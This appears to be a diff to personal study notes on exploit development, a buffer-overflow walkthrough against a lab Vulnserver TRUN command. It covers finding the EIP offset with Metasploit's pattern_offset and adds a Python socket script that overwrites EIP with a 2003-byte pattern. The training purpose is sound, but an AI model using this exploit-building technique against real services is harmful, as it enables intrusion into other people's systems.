@@ -458,7 +458,73 @@ while True:
     
         - `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337`
    
-    - After we press "enter", we should find a **pattern offset**
+    - After we press "enter", we should find a **pattern offset**:
+    
+        - ![image](https://user-images.githubusercontent.com/94720207/169337292-8822b365-271d-430a-994d-5a37b81ca3a0.png)
+
+    - **Now we know that the exact offset value si `2003`** but how?
+    
+        - Metasploit just searched between the 3000 pattern the pattern which match exactly "386F4337"
+        - That exact pattern started just at `2003 bytes`, like a "crossover" ot better said: the offset
+        
+            - **This information is critical, because this means that exactly at 2003 bytes, we can control `EIP` overwriting it**
+
+---
+
+### Overwriting the EIP
+
+- We know that the offset for make the program crash and point exactly to the `EIP` is at `2003 bytes`.
+
+    - **That means, `2003 bytes` just before to get to the `EIP`**
+    
+    - **The `EIP` itself is `4 bytes` long** 
+    
+- So, we going to overwrite this specific `4 bytes`! ;) 
+
+    - Again, We only need to copy that code and modify the `l.py` or `2.py` that we made on past tasks.
+    
+    - We can make another file called `3.py` with the modification.
+    
+        - **We delete de "offset" variable, we don't need it anymore.**
+        
+        - **And instead of "offset" we will place "shellcode" variable.**
+        
+            - **"shellcode" variable will be = "A" * 2003 + "B" * 4**
+
+```python
+#!/usr/bin/python
+import sys, socket
+from time import sleep
+
+shellcode = "A" * 2003 + "B" * 4
+
+while True:
+        try:
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect(('192.168.1.100', 9999))
+                
+                s.send(('TRUN /.:/' + shellcode))
+                s.close()
+        
+        except:
+                print "Error connecting to server"
+                sys.exit()
+```
+
+- With this change adding the "shellcode" variable this is what happen: 
+
+    - **We replaced what we sent before (crazy code) and now we are sending 2003 A's (2003 bytes) + 4 B's (4 bytes)**
+    
+    - At the moment the shellcode is only A's and B's, but it can get malicious! 
+    
+        - **We send 2003 A's, because at 2003 bytes is where the `EIP` offset starts**
+        
+        - **This means, just at 2004 bytes, `EIP` starts itself, using 4 bytes (B's)**
+        
+        - **So, the idea here is filling the exact value we need to reach the offset with A's, and then fill `EIP` with B's, so we can identify where is exactly `EIP` located at the memory**
+        
+        -    
+
 
 
 
